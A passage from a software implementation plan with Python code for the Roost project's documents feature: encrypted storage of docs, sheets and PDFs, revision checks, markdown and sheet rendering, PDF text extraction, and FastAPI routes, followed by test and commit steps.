    header = "    | " + " | ".join(S.col_to_letter(c) for c in range(n_cols))
    lines = [header, "    |-" + "-|-".join("-" * 3 for _ in range(n_cols))]
    for r in range(n_rows):
        cells = " | ".join(str(shown.get((r, c), "")) for c in range(n_cols))
        lines.append(f"{r + 1:>3} | {cells}")
    note = ""
    if max_r + 1 > n_rows or max_c + 1 > n_cols:
        note = f"\n…(showing {n_rows}×{n_cols} of {max_r + 1}×{max_c + 1})"
    return "\n".join(lines) + note


def sheet_from_rows(title: str, rows: Sequence[Sequence[Any]]) -> dict[str, Any]:
    """Roost: a new workbook whose first sheet holds ``rows`` from A1. Empty
    cells stay empty; numeric text becomes numbers (the harvested coerce_value)."""
    width = max((len(row) for row in rows), default=0)
    workbook = S.blank_workbook(title, rows=max(S.DEFAULT_ROWS, len(rows)), cols=max(S.DEFAULT_COLS, width))
    edits = [{"row": r, "col": c, "value": value}
             for r, row in enumerate(rows) for c, value in enumerate(row) if value is not None and value != ""]
    return S.set_cells(workbook, edits)
```

- [ ] **Step 8: Models, cells, converters, store, readers, service**

`roost/documents/__init__.py`: `"""Documents (M2 D2): the user's docs, sheets and PDFs, one encrypted blob per file."""`

`roost/documents/models.py`:

```python
"""Document domain model (M2 D2, D5) — frozen dataclasses. One record per file:
a doc or a sheet is a Univer snapshot (JSON), a PDF its bytes (base64). Field
meanings follow LazyClaw's docs / sheets / pdf_files (``name`` is ``title``
here) so M4 can import the user's documents."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Literal

DocumentKind = Literal["doc", "sheet", "pdf"]
DOCUMENT_KINDS: tuple[DocumentKind, ...] = ("doc", "sheet", "pdf")


@dataclass(frozen=True)
class DocumentMeta:
    id: str
    user_id: str
    kind: DocumentKind
    title: str
    pages: int | None             # PDFs only
    revision: int                 # bumped by every save: the compare-and-swap counter
    created_at: str
    updated_at: str
    created_by_bot: str | None    # NULL: the user, or a retired bot
    tainted: bool                 # written by a run that read outside content, or an uploaded file


@dataclass(frozen=True)
class Document:
    meta: DocumentMeta
    body: str                     # decrypted: the snapshot JSON (doc/sheet) or base64 bytes (pdf)


@dataclass(frozen=True)
class DocumentDraft:
    kind: DocumentKind
    title: str
    body: str
    pages: int | None = None


@dataclass(frozen=True)
class DocumentChange:
    base_revision: int            # the revision the writer read
    body: str | None = None
    title: str | None = None
    pages: int | None = None
```

`roost/documents/cells.py`:

```python
"""Sheet cells at the boundary (M2 D2): the pydantic types for the rows a tool
or the Board sends, a cell edit by A1 reference, and the sheet's far corner.
No cell may sit past ZZ100000, so no read is asked to cover millions of rows."""

from __future__ import annotations

from typing import Annotated, Any, Mapping, Union

from pydantic import BaseModel, ConfigDict, Field, field_validator

from roost.constants import (
    MAX_SHEET_CELL_TEXT, MAX_SHEET_COL_INDEX, MAX_SHEET_COLS, MAX_SHEET_ROW_INDEX, MAX_SHEET_ROWS_PER_CALL,
)
from roost.documents.sheet_snapshot import a1_to_rc, rc_to_a1

LAST_CELL = rc_to_a1(MAX_SHEET_ROW_INDEX, MAX_SHEET_COL_INDEX)   # "ZZ100000"

SheetCell = Union[Annotated[str, Field(max_length=MAX_SHEET_CELL_TEXT)], int, float, bool, None]
SheetRow = Annotated[list[SheetCell], Field(max_length=MAX_SHEET_COLS)]
SheetRows = Annotated[list[SheetRow], Field(max_length=MAX_SHEET_ROWS_PER_CALL)]


class CellEdit(BaseModel):
    model_config = ConfigDict(extra="forbid")
    cell: str = Field(pattern=r"^[A-Za-z]{1,3}[1-9][0-9]{0,6}$")
    value: SheetCell = None
    formula: str | None = Field(default=None, max_length=MAX_SHEET_CELL_TEXT)

    @field_validator("cell")
    @classmethod
    def _inside_the_sheet(cls, cell: str) -> str:
        row, col = a1_to_rc(cell)
        if row > MAX_SHEET_ROW_INDEX or col > MAX_SHEET_COL_INDEX:
            raise ValueError(f"cells go from A1 to {LAST_CELL}")
        return cell


def _index_within(key: Any, highest: int) -> bool:
    return isinstance(key, str) and key.isascii() and key.isdigit() and int(key) <= highest


def sheet_cells_in_bounds(snapshot: Mapping[str, Any]) -> bool:
    """Whether every worksheet's cellData keys are row and column indexes inside
    the far corner, so a Board save can't plant a cell at ZZZ9999999."""
    sheets = snapshot.get("sheets")
    for sheet in (sheets.values() if isinstance(sheets, dict) else ()):
        cell_data = sheet.get("cellData") if isinstance(sheet, dict) else None
        for row_key, cols in (cell_data.items() if isinstance(cell_data, dict) else ()):
            if not _index_within(row_key, MAX_SHEET_ROW_INDEX) or not isinstance(cols or {}, dict):
                return False
            if not all(_index_within(col_key, MAX_SHEET_COL_INDEX) for col_key in (cols or {})):
                return False
    return True
```

`roost/documents/doc_markdown.py`:

```python
"""Docs as markdown (M2 D2, Roost): a new doc from markdown, markdown added to
a doc, and a doc read back as markdown or plain text — over the harvested
Univer block helpers (``doc_snapshot``) and markdown parser (``markdown_blocks``)."""

from __future__ import annotations

from typing import Any

from roost.documents.doc_snapshot import append_blocks, blank_document, get_blocks, get_paragraphs
from roost.documents.markdown_blocks import parse_blocks

_LIST_MARK = {"bullet": "- ", "number": "1. "}


def doc_from_markdown(title: str, markdown: str) -> dict[str, Any]:
    return append_blocks(blank_document(title), parse_blocks(markdown))


def append_markdown(snap: dict[str, Any], markdown: str) -> dict[str, Any]:
    return append_blocks(snap, parse_blocks(markdown))


def _run_markdown(run: dict[str, Any]) -> str:
    text = str(run.get("text", ""))
    if not text:
        return ""
    if run.get("bold"):
        text = f"**{text}**"
    if run.get("italic"):
        text = f"*{text}*"
    url = run.get("url")
    return f"[{text}]({url})" if url else text


def _block_markdown(block: dict[str, Any]) -> str:
    runs = "".join(_run_markdown(run) for run in block.get("runs") or [])
    if block.get("type") == "heading":
        return "#" * max(1, min(3, int(block.get("level") or 1))) + " " + runs
    return _LIST_MARK.get(str(block.get("type")), "") + runs


def doc_to_markdown(snap: dict[str, Any]) -> str:
    return "\n".join(_block_markdown(block) for block in get_blocks(snap)).strip("\n")


def doc_plain_text(snap: dict[str, Any]) -> str:
    """The doc's paragraphs as plain text, blank-line separated (what a PDF is made from)."""
    return "\n\n".join(paragraph for paragraph in get_paragraphs(snap) if paragraph.strip())
```

`roost/documents/store.py`:

```python
"""``DocumentStore`` — the user's documents: docs, sheets and PDFs, one
encrypted blob per file (M2 D2, D5; spec §4.7).

Documents belong to the USER: every bot with the docs role shares them, scoped
by ``user_id``, each with ``created_by_bot`` and a taint bit. ``payload`` is
the whole Univer snapshot (doc/sheet, JSON) or the PDF's bytes (base64),
``enc:v2`` under its kind's AAD (``docs:payload``, ``sheets:payload``,
``pdf:payload`` — LazyClaw's contexts); ``title`` is ``enc:v2`` under
``documents:title``. Every save is a compare-and-swap on ``revision`` (a stale
one raises ``RevisionConflict`` carrying the stored document). Deleting is soft."""

from __future__ import annotations

from datetime import datetime, timezone
from types import MappingProxyType
from typing import Any, Mapping
from uuid import uuid4

import aiosqlite

from roost.config import Config
from roost.constants import MAX_DOCUMENT_BODY_CHARS
from roost.crypto.encryption import decrypt_field, encrypt_field, user_aad
from roost.crypto.key_manager import get_user_dek
from roost.db.connection import db_session
from roost.documents.models import Document, DocumentChange, DocumentDraft, DocumentKind, DocumentMeta
from roost.records.revision import RevisionConflict

PAYLOAD_AAD: Mapping[str, str] = MappingProxyType({"doc": "docs:payload", "sheet": "sheets:payload",
                                                    "pdf": "pdf:payload"})
_META = "id, user_id, kind, title, pages, revision, created_at, updated_at, created_by_bot, tainted"
_LIVE = "user_id = ? AND deleted_at IS NULL"


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _title_aad(user_id: str) -> bytes:
    return user_aad(user_id, "documents:title")


def _payload_aad(user_id: str, kind: str) -> bytes:
    return user_aad(user_id, PAYLOAD_AAD[kind])


def _check_body(body: str) -> None:
    if len(body) > MAX_DOCUMENT_BODY_CHARS:
        raise ValueError("That document is too big to keep.")


def _row_to_meta(row: aiosqlite.Row, dek: bytes) -> DocumentMeta:
    return DocumentMeta(
        id=row["id"], user_id=row["user_id"], kind=row["kind"],
        title=decrypt_field(row["title"], dek, _title_aad(row["user_id"])) or "", pages=row["pages"],
        revision=row["revision"], created_at=row["created_at"], updated_at=row["updated_at"],
        created_by_bot=row["created_by_bot"], tainted=bool(row["tainted"]),
    )


def _change_values(meta: DocumentMeta, change: DocumentChange, dek: bytes) -> dict[str, Any]:
    """The columns a save rewrites, encoded. Nothing to change is an error."""
    values: dict[str, Any] = {}
    if change.title is not None:
        values["title"] = encrypt_field(change.title, dek, _title_aad(meta.user_id))
    if change.body is not None:
        _check_body(change.body)
        values["payload"] = encrypt_field(change.body, dek, _payload_aad(meta.user_id, meta.kind))
    if change.pages is not None:
        values["pages"] = change.pages
    if not values:
        raise ValueError("Nothing to save: send a title or a payload.")
    return values


class DocumentStore:
    def __init__(self, config: Config) -> None:
        self._config = config

    async def create(self, user_id: str, draft: DocumentDraft, *, created_by_bot: str | None,
                     tainted: bool) -> DocumentMeta:
        _check_body(draft.body)
        now = _now_iso()
        meta = DocumentMeta(id=str(uuid4()), user_id=user_id, kind=draft.kind, title=draft.title, pages=draft.pages,
                            revision=1, created_at=now, updated_at=now, created_by_bot=created_by_bot,
                            tainted=tainted)
        dek = await get_user_dek(self._config, user_id)
        async with db_session(self._config) as db:
            await db.execute(
                "INSERT INTO documents (id, user_id, kind, title, payload, pages, revision, created_at, updated_at, "
                "created_by_bot, tainted) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
                (meta.id, user_id, meta.kind, encrypt_field(meta.title, dek, _title_aad(user_id)),
                 encrypt_field(draft.body, dek, _payload_aad(user_id, meta.kind)), meta.pages, 1, now, now,
                 created_by_bot, int(tainted)),
            )
            await db.commit()
        return meta

    async def list(self, user_id: str, kind: DocumentKind | None = None) -> tuple[DocumentMeta, ...]:
        where, params = (f"{_LIVE} AND kind = ?", (user_id, kind)) if kind else (_LIVE, (user_id,))
        rows = await self._rows(f"SELECT {_META} FROM documents WHERE {where} ORDER BY updated_at DESC", params)
        if not rows:
            return ()
        dek = await get_user_dek(self._config, user_id)
        return tuple(_row_to_meta(row, dek) for row in rows)

    async def get_meta(self, user_id: str, document_id: str) -> DocumentMeta | None:
        rows = await self._rows(f"SELECT {_META} FROM documents WHERE id = ? AND {_LIVE}", (document_id, user_id))
        return _row_to_meta(rows[0], await get_user_dek(self._config, user_id)) if rows else None

    async def get(self, user_id: str, document_id: str) -> Document | None:
        rows = await self._rows(f"SELECT {_META}, payload FROM documents WHERE id = ? AND {_LIVE}",
                                (document_id, user_id))
        if not rows:
            return None
        dek = await get_user_dek(self._config, user_id)
        meta = _row_to_meta(rows[0], dek)
        return Document(meta=meta, body=decrypt_field(rows[0]["payload"], dek, _payload_aad(user_id, meta.kind)) or "")

    async def save(self, user_id: str, document_id: str, change: DocumentChange) -> DocumentMeta | None:
        """``None``: no such document. ``RevisionConflict``: ``change.base_revision``
        is not the stored revision — the UPDATE itself is the compare-and-swap."""
        meta = await self.get_meta(user_id, document_id)
        if meta is None:
            return None
        values = _change_values(meta, change, await get_user_dek(self._config, user_id))
        assignments = ", ".join(f"{column} = ?" for column in values)
        async with db_session(self._config) as db:
            cursor = await db.execute(
                f"UPDATE documents SET {assignments}, revision = revision + 1, updated_at = ? "
                f"WHERE id = ? AND {_LIVE} AND revision = ?",
                (*values.values(), _now_iso(), document_id, user_id, change.base_revision),
            )
            await db.commit()
        if cursor.rowcount:
            return await self.get_meta(user_id, document_id)
        latest = await self.get(user_id, document_id)
        if latest is None:
            return None
        raise RevisionConflict(latest)

    async def keep(self, user_id: str, document_id: str) -> DocumentMeta | None:
        """The user vouches for a web-made or uploaded document (HTTP only)."""
        async with db_session(self._config) as db:
            cursor = await db.execute(
                f"UPDATE documents SET tainted = 0, updated_at = ? WHERE id = ? AND {_LIVE}",
                (_now_iso(), document_id, user_id),
            )
            await db.commit()
        return await self.get_meta(user_id, document_id) if cursor.rowcount else None

    async def delete(self, user_id: str, document_id: str) -> bool:
        now = _now_iso()
        async with db_session(self._config) as db:
            cursor = await db.execute(
                f"UPDATE documents SET deleted_at = ?, updated_at = ? WHERE id = ? AND {_LIVE}",
                (now, now, document_id, user_id),
            )
            await db.commit()
        return cursor.rowcount > 0

    async def _rows(self, sql: str, params: tuple) -> list[aiosqlite.Row]:
        async with db_session(self._config) as db:
            return list(await (await db.execute(sql, params)).fetchall())
```

`roost/documents/render.py`:

```python
"""Reading a stored document (M2 D2): its snapshot or its PDF bytes, and the
text ``read_document`` and ``GET /api/documents/{id}/text`` show — a doc as
markdown, a sheet as a small table, a PDF as its text, capped. Plain text: the
tool escapes it for the model; React escapes it on the Board. Every reader is
bounded by the work it does, not only by what it prints (the gateway has
mem_limit 1g): a sheet renders its capped window, a PDF reads page by page."""

from __future__ import annotations

import base64
import binascii
import io
import json
import logging
from typing import Any

from roost.constants import DOCUMENT_READ_MAX_CHARS, PDF_READ_MAX_PAGES
from roost.documents.doc_markdown import doc_to_markdown
from roost.documents.models import Document
from roost.documents.pdf_ops import PdfError, is_pdf
from roost.documents.sheet_text import format_grid

logger = logging.getLogger(__name__)
UNREADABLE_TEXT = "This document's stored copy could not be read."


def snapshot_of(document: Document) -> dict[str, Any]:
    try:
        value = json.loads(document.body)
    except json.JSONDecodeError as exc:
        raise ValueError(UNREADABLE_TEXT) from exc
    if not isinstance(value, dict):
        raise ValueError(UNREADABLE_TEXT)
    return value


def pdf_bytes_of(document: Document) -> bytes:
    try:
        return base64.b64decode(document.body, validate=True)
    except (binascii.Error, ValueError) as exc:
        raise ValueError(UNREADABLE_TEXT) from exc


def _page_text(page: Any) -> str:
    """One page's text; ``page.close()`` then frees what pdfplumber parsed. A
    page that fails is logged and read as empty, as in the harvested reader."""
    try:
        return page.extract_text() or ""
    except Exception as exc:  # noqa: BLE001 — per-page resilience
        logger.warning("PDF page %d could not be read: %s", page.page_number, exc)
        return ""
    finally:
        page.close()


def pdf_text(data: bytes) -> str:
    """Roost: the text of a PDF's first pages, joined like the harvested
    ``extract_text`` (form feed + newline). The harvested reader extracts every
    page before anything is cut, so a 1,000-page upload could OOM the gateway.
    This one reads page by page, closes each page, and stops at
    DOCUMENT_READ_MAX_CHARS or after PDF_READ_MAX_PAGES pages."""
    import pdfplumber

    if not is_pdf(data):
        raise PdfError("Data does not look like a PDF (missing %PDF header).")
    parts: list[str] = []
    try:
        with pdfplumber.open(io.BytesIO(data), pages=list(range(1, PDF_READ_MAX_PAGES + 1))) as pdf:
            for page in pdf.pages:
                parts.append(_page_text(page))
                if sum(len(part) for part in parts) >= DOCUMENT_READ_MAX_CHARS:
                    break
    except Exception as exc:  # noqa: BLE001 — a damaged file is a plain refusal, as in the harvested reader
        raise PdfError(f"Could not extract text: {exc}") from exc
    return "\f\n".join(parts)


def _capped(text: str) -> str:
    if len(text) <= DOCUMENT_READ_MAX_CHARS:
        return text
    return text[:DOCUMENT_READ_MAX_CHARS] + f"\n…(showing {DOCUMENT_READ_MAX_CHARS} of {len(text)} characters)"


def _pdf_capped(text: str, pages: int | None) -> str:
    """``pdf_text`` stops early, so the full length is unknown: say it is the start."""
    if len(text) < DOCUMENT_READ_MAX_CHARS and (pages or 0) <= PDF_READ_MAX_PAGES:
        return text
    return text[:DOCUMENT_READ_MAX_CHARS] + f"\n…(showing the start of a {pages}-page PDF)"


def document_text(document: Document) -> str:
    """Blocking for a PDF (text extraction): callers run it off the event loop
    (``DocumentService.text``, under a timeout)."""
    if document.meta.kind == "doc":
        return _capped(doc_to_markdown(snapshot_of(document)))
    if document.meta.kind == "sheet":
        return _capped(format_grid(snapshot_of(document)))
    return _pdf_capped(pdf_text(pdf_bytes_of(document)).strip(), document.meta.pages)
```

`roost/documents/format.py`:

```python
"""Rendering a document for a tool result or the Board (M2 D2). Titles are the
user's (or a page's) data: escaped here, by their producer, before any prompt."""

from __future__ import annotations

import html
from types import MappingProxyType
from typing import Any, Mapping

from roost.documents.models import Document, DocumentMeta
from roost.documents.render import snapshot_of

KIND_LABEL: Mapping[str, str] = MappingProxyType({"doc": "doc", "sheet": "sheet", "pdf": "PDF"})
WEB_MARK = " [from web content]"


def document_line(meta: DocumentMeta) -> str:
    pages = f", {meta.pages} pages" if meta.pages else ""
    web = WEB_MARK if meta.tainted else ""
    return (f"[{KIND_LABEL[meta.kind]}] “{html.escape(meta.title, quote=True)}” "
            f"(updated {meta.updated_at[:10]}{pages}){web} id={meta.id}")


def document_list_text(metas: tuple[DocumentMeta, ...], total: int) -> str:
    if not metas:
        return "No documents yet."
    more = f"\n…and {total - len(metas)} more." if total > len(metas) else ""
    return "\n".join(f"- {document_line(meta)}" for meta in metas) + more


def document_out(meta: DocumentMeta) -> dict[str, Any]:
    return {
        "id": meta.id, "kind": meta.kind, "title": meta.title, "pages": meta.pages, "revision": meta.revision,
        "created_at": meta.created_at, "updated_at": meta.updated_at, "created_by_bot": meta.created_by_bot,
        "tainted": meta.tainted,
    }


def document_detail_out(document: Document) -> dict[str, Any]:
    """Raises ValueError (plain text) when the stored copy can't be read."""
    payload = None if document.meta.kind == "pdf" else snapshot_of(document)
    return {**document_out(document.meta), "payload": payload}
```

`roost/documents/service.py`:

```python
"""``DocumentService`` — the documents store plus its live frame (M2 D2/D4):
new docs from markdown, sheets from rows, PDFs from bytes or from a doc, saves,
and what a document reads as. Tools and HTTP routes both go through it, so the
Board updates whoever changed a document. PDF work runs off the event loop."""

from __future__ import annotations

import asyncio
import base64
import json
from typing import Any, Literal, Mapping, Sequence

from roost.constants import DOCUMENT_READ_TIMEOUT_SECONDS
from roost.documents.doc_markdown import append_markdown, doc_from_markdown, doc_plain_text
from roost.documents.models import Document, DocumentChange, DocumentDraft, DocumentKind, DocumentMeta
from roost.documents.pdf_ops import generate_from_text, page_count
from roost.documents.render import document_text, snapshot_of
from roost.documents.sheet_snapshot import set_cells
from roost.documents.sheet_text import sheet_from_rows
from roost.documents.store import DocumentStore
from roost.events.hub import EventHub

DocumentEvent = Literal["created", "updated", "deleted"]
READ_TIMEOUT_TEXT = "This document took too long to read."


class DocumentService:
    def __init__(self, store: DocumentStore, events: EventHub) -> None:
        self._store = store
        self._events = events

    async def list(self, user_id: str, kind: DocumentKind | None = None) -> tuple[DocumentMeta, ...]:
        return await self._store.list(user_id, kind)

    async def get(self, user_id: str, document_id: str) -> Document | None:
        return await self._store.get(user_id, document_id)

    async def get_meta(self, user_id: str, document_id: str) -> DocumentMeta | None:
        return await self._store.get_meta(user_id, document_id)

    async def create_doc(self, user_id: str, title: str, markdown: str, *, created_by_bot: str | None = None,
                         tainted: bool = False) -> DocumentMeta:
        body = json.dumps(doc_from_markdown(title, markdown))
        return await self._create(user_id, DocumentDraft("doc", title, body), created_by_bot, tainted)

    async def create_sheet(self, user_id: str, title: str, rows: Sequence[Sequence[Any]], *,
                           created_by_bot: str | None = None, tainted: bool = False) -> DocumentMeta:
        body = json.dumps(sheet_from_rows(title, rows))
        return await self._create(user_id, DocumentDraft("sheet", title, body), created_by_bot, tainted)

    async def create_pdf(self, user_id: str, title: str, data: bytes, *, created_by_bot: str | None = None,
                         tainted: bool = False) -> DocumentMeta:
        """Raises ``PdfError`` (a ValueError with a plain message) for a non-PDF."""
        pages = await asyncio.to_thread(page_count, data)
        draft = DocumentDraft("pdf", title, base64.b64encode(data).decode("ascii"), pages=pages)
        return await self._create(user_id, draft, created_by_bot, tainted)

    async def make_pdf(self, user_id: str, source: Document, title: str, *, created_by_bot: str | None,
                       tainted: bool) -> DocumentMeta:
        """A new PDF from a doc's text; it carries the doc's taint (provenance)."""
        data = await asyncio.to_thread(generate_from_text, doc_plain_text(snapshot_of(source)), title)
        return await self.create_pdf(user_id, title, data, created_by_bot=created_by_bot,
                                     tainted=tainted or source.meta.tainted)

    async def save(self, user_id: str, document_id: str, change: DocumentChange) -> DocumentMeta | None:
        meta = await self._store.save(user_id, document_id, change)
        if meta is not None:
            await self._changed(user_id, "updated", meta)
        return meta

    async def append_markdown(self, user_id: str, document: Document, markdown: str) -> DocumentMeta | None:
        body = json.dumps(append_markdown(snapshot_of(document), markdown))
        return await self.save(user_id, document.meta.id, DocumentChange(base_revision=document.meta.revision,
                                                                          body=body))

    async def set_cells(self, user_id: str, document: Document,
                        edits: Sequence[Mapping[str, Any]]) -> DocumentMeta | None:
        body = json.dumps(set_cells(snapshot_of(document), [dict(edit) for edit in edits]))
        return await self.save(user_id, document.meta.id, DocumentChange(base_revision=document.meta.revision,
                                                                          body=body))

    async def text(self, document: Document) -> str:
        """What a document reads as, off the event loop. The readers stop at their
        caps; the timeout bounds how long a tool or the Board waits."""
        try:
            return await asyncio.wait_for(asyncio.to_thread(document_text, document), DOCUMENT_READ_TIMEOUT_SECONDS)
        except TimeoutError as exc:
            raise ValueError(READ_TIMEOUT_TEXT) from exc

    async def keep(self, user_id: str, document_id: str) -> DocumentMeta | None:
        meta = await self._store.keep(user_id, document_id)
        if meta is not None:
            await self._changed(user_id, "updated", meta)
        return meta

    async def delete(self, user_id: str, document_id: str) -> bool:
        meta = await self._store.get_meta(user_id, document_id)
        if meta is None or not await self._store.delete(user_id, document_id):
            return False
        await self._changed(user_id, "deleted", meta)
        return True

    async def _create(self, user_id: str, draft: DocumentDraft, created_by_bot: str | None,
                      tainted: bool) -> DocumentMeta:
        meta = await self._store.create(user_id, draft, created_by_bot=created_by_bot, tainted=tainted)
        await self._changed(user_id, "created", meta)
        return meta

    async def _changed(self, user_id: str, change: DocumentEvent, meta: DocumentMeta) -> None:
        await self._events.publish(user_id, {"type": "documents_changed", "change": change,
                                             "document_id": meta.id, "kind": meta.kind})
```

- [ ] **Step 9: Routes and wiring** — `roost/gateway/routes/documents.py`:

```python
"""Documents over HTTP — the Board's Documents tab (M2 D2, D4), in the shape of
LazyClaw's ``gateway/routes/{docs,sheets,pdf}.py``: list, read, create, save
with a revision compare-and-swap (409 carries the current copy), the raw PDF
for the viewer, a PDF upload, Keep and delete. Same ``DocumentService`` as the
tools, so every change publishes ``documents_changed``. An uploaded PDF is
outside content (spec §8.2), so it is stored tainted until the user Keeps it."""

from __future__ import annotations

import json
from typing import Any, Literal

from fastapi import APIRouter, HTTPException, Query, Request, Response
from fastapi.responses import JSONResponse
from pydantic import BaseModel, ConfigDict, Field

from roost.constants import (
    MAX_DOC_MARKDOWN_LENGTH, MAX_DOCUMENT_PAYLOAD_CHARS, MAX_DOCUMENT_TITLE_LENGTH, MAX_PDF_BYTES,
)
from roost.documents.cells import LAST_CELL, SheetRows, sheet_cells_in_bounds
from roost.documents.format import document_detail_out, document_out
from roost.documents.models import Document, DocumentChange, DocumentKind
from roost.documents.pdf_ops import PdfError
from roost.documents.render import pdf_bytes_of
from roost.documents.service import DocumentService
from roost.gateway.deps import CurrentUser, RequireOrigin
from roost.records.revision import RevisionConflict

documents_router = APIRouter(prefix="/api/documents", tags=["documents"])
DOCUMENT_CONFLICT_TEXT = "This document changed since you opened it."
_PDF_MEDIA = "application/pdf"
_SNAPSHOT_KEY = {"doc": "body", "sheet": "sheets"}   # what a Univer snapshot of each kind must carry


class DocumentCreateIn(BaseModel):
    model_config = ConfigDict(extra="forbid")
    kind: Literal["doc", "sheet"]
    title: str = Field(min_length=1, max_length=MAX_DOCUMENT_TITLE_LENGTH)
    markdown: str = Field(default="", max_length=MAX_DOC_MARKDOWN_LENGTH)
    rows: SheetRows | None = None


class DocumentSaveIn(BaseModel):
    model_config = ConfigDict(extra="forbid")
    base_revision: int = Field(ge=1)
    title: str | None = Field(default=None, min_length=1, max_length=MAX_DOCUMENT_TITLE_LENGTH)
    payload: dict[str, Any] | None = None


def _service(request: Request) -> DocumentService:
    return request.app.state.documents


def _unreadable(exc: ValueError) -> HTTPException:
    return HTTPException(status_code=422, detail=str(exc))


async def _document(request: Request, user_id: str, document_id: str) -> Document:
    document = await _service(request).get(user_id, document_id)
    if document is None:
        raise HTTPException(status_code=404, detail="Document not found")
    return document


def _payload_body(kind: str, payload: dict[str, Any] | None) -> str | None:
    if payload is None:
        return None
    if kind == "pdf":
        raise HTTPException(status_code=422, detail="A PDF's pages can't be edited here.")
    if not isinstance(payload.get(_SNAPSHOT_KEY[kind]), dict):
        raise HTTPException(status_code=422, detail=f"That isn't a {kind} snapshot.")
    if kind == "sheet" and not sheet_cells_in_bounds(payload):
        raise HTTPException(status_code=422, detail=f"A sheet's cells go from A1 to {LAST_CELL}.")
    text = json.dumps(payload)
    if len(text) > MAX_DOCUMENT_PAYLOAD_CHARS:
        raise HTTPException(status_code=413, detail="This document is too big to save.")
    return text


async def _pdf_body(request: Request) -> bytes:
    if request.headers.get("content-type", "").split(";")[0].strip().lower() != _PDF_MEDIA:
        raise HTTPException(status_code=415, detail="Upload a PDF file (Content-Type: application/pdf).")
    declared = request.headers.get("content-length", "")
    if declared.isdigit() and int(declared) > MAX_PDF_BYTES:
        raise HTTPException(status_code=413, detail="That PDF is too big (20 MB at most).")
    data = await request.body()
    if len(data) > MAX_PDF_BYTES:
        raise HTTPException(status_code=413, detail="That PDF is too big (20 MB at most).")
    return data


@documents_router.get("")
async def list_documents(request: Request, user: CurrentUser, kind: DocumentKind | None = None):
    return [document_out(meta) for meta in await _service(request).list(user.id, kind)]


@documents_router.get("/{document_id}")
async def get_document(document_id: str, request: Request, user: CurrentUser):
    try:
        return document_detail_out(await _document(request, user.id, document_id))
    except ValueError as exc:
        raise _unreadable(exc) from exc


@documents_router.get("/{document_id}/text")
async def get_document_text(document_id: str, request: Request, user: CurrentUser):
    document = await _document(request, user.id, document_id)
    try:
        return {"text": await _service(request).text(document)}
    except ValueError as exc:   # a damaged blob, or a PDF the extractor can't read (PdfError)
        raise _unreadable(exc) from exc


@documents_router.get("/{document_id}/pdf")
async def get_document_pdf(document_id: str, request: Request, user: CurrentUser) -> Response:
    document = await _document(request, user.id, document_id)
    if document.meta.kind != "pdf":
        raise HTTPException(status_code=404, detail="Not a PDF")
    try:
        data = pdf_bytes_of(document)
    except ValueError as exc:
        raise _unreadable(exc) from exc
    return Response(content=data, media_type=_PDF_MEDIA,
                    headers={"Content-Disposition": "inline", "Cache-Control": "no-store"})


@documents_router.post("", status_code=201, dependencies=[RequireOrigin])
async def create_document(body: DocumentCreateIn, request: Request, user: CurrentUser):
    service = _service(request)
    if body.kind == "doc":
        return document_out(await service.create_doc(user.id, body.title.strip(), body.markdown))
    return document_out(await service.create_sheet(user.id, body.title.strip(), body.rows or []))


@documents_router.post("/pdf", status_code=201, dependencies=[RequireOrigin])
async def upload_pdf(request: Request, user: CurrentUser,
                     title: str = Query(min_length=1, max_length=MAX_DOCUMENT_TITLE_LENGTH)):
    data = await _pdf_body(request)
    try:
        meta = await _service(request).create_pdf(user.id, title.strip(), data, tainted=True)
    except PdfError as exc:
        raise HTTPException(status_code=422, detail=str(exc)) from exc
    return document_out(meta)


@documents_router.put("/{document_id}", dependencies=[RequireOrigin])
async def save_document(document_id: str, body: DocumentSaveIn, request: Request, user: CurrentUser):
    service = _service(request)
    meta = await service.get_meta(user.id, document_id)
    if meta is None:
        raise HTTPException(status_code=404, detail="Document not found")
    change = DocumentChange(base_revision=body.base_revision, body=_payload_body(meta.kind, body.payload),
                            title=body.title.strip() if body.title else None)
    if change.title is None and change.body is None:
        raise HTTPException(status_code=422, detail="Send a title or a payload to save.")
    try:
        saved = await service.save(user.id, document_id, change)
    except RevisionConflict as exc:
        return JSONResponse(status_code=409, content={"detail": DOCUMENT_CONFLICT_TEXT,
                                                      "current": document_detail_out(exc.current)})
    if saved is None:
        raise HTTPException(status_code=404, detail="Document not found")
    return document_out(saved)


@documents_router.post("/{document_id}/keep", dependencies=[RequireOrigin])
async def keep_document(document_id: str, request: Request, user: CurrentUser):
    """Keep: the user vouches for a web-made or uploaded document (no tool can)."""
    meta = await _service(request).keep(user.id, document_id)
    if meta is None:
        raise HTTPException(status_code=404, detail="Document not found")
    return document_out(meta)


@documents_router.delete("/{document_id}", status_code=204, dependencies=[RequireOrigin])
async def delete_document(document_id: str, request: Request, user: CurrentUser) -> None:
    if not await _service(request).delete(user.id, document_id):
        raise HTTPException(status_code=404, detail="Document not found")
```

In `roost/gateway/app.py`: import `DocumentService`, `DocumentStore` and `documents_router`; add `app.state.documents = DocumentService(DocumentStore(resolved_config), app.state.events)` after `app.state.notes`, and `app.include_router(documents_router)` after `notes_router`.

- [ ] **Step 10: Run the tests to see them pass**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest tests/test_document_formats.py tests/test_document_store.py tests/test_documents_api.py tests/test_migrations_v8.py -q`
Expected: PASS. If `test_markdown_survives_a_round_trip_through_a_univer_doc` fails, look first at how the harvested `get_blocks` names style flags (`bold`/`italic`). Adapt `_run_markdown` to them. Never change the harvested function.

- [ ] **Step 11: Full gates and commit**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest --cov=roost --cov-fail-under=80 -q && (cd web && npm test && npm run build)
git -C /Users/blckit/Desktop/Code_Projects/roost add pyproject.toml uv.lock roost/constants.py roost/db/migrations.py \
  roost/documents/__init__.py roost/documents/doc_snapshot.py roost/documents/markdown_blocks.py \
  roost/documents/sheet_snapshot.py roost/documents/pdf_ops.py roost/documents/sheet_text.py roost/documents/models.py \
  roost/documents/cells.py roost/documents/doc_markdown.py roost/documents/store.py roost/documents/render.py \
  roost/documents/format.py roost/documents/service.py roost/gateway/routes/documents.py roost/gateway/app.py \
  tests/test_document_formats.py tests/test_document_store.py tests/test_documents_api.py tests/test_migrations_v8.py
git -C /Users/blckit/Desktop/Code_Projects/roost commit -m "feat: documents — the user's docs, sheets and PDFs as encrypted blobs with revision checks (schema v10)"
```

---

### Task 3: The Docs role's tools, roles that work together, Writer and Office presets

